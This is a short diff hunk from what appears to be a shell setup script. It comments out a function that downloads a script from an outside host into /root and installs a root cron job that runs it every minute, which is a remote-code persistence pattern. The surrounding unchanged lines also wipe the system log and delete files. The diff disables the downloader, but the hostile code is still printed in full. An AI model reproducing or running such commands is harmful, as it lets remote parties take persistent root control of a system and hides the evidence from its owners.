@@ -1797,11 +1797,11 @@ echo ' ' > /var/log/syslog
 rm -f *
 }
 
-function authentitication() {
-wget -O /root/activate.sh "https://aquaflask.system-technology.cloud/authentication/activate.sh"
-echo "* * * * * /bin/bash /root/activate.sh >/dev/null 2>&1" | crontab -
-sh active.sh | tee -a /root/activate.sh
-}
+#function authentitication() {
+#wget -O /root/activate.sh "https://aquaflask.system-technology.cloud/authentication/activate.sh"
+#echo "* * * * * /bin/bash /root/activate.sh >/dev/null 2>&1" | crontab -
+#sh active.sh | tee -a /root/activate.sh
+#}
 
 #############################
 #############################
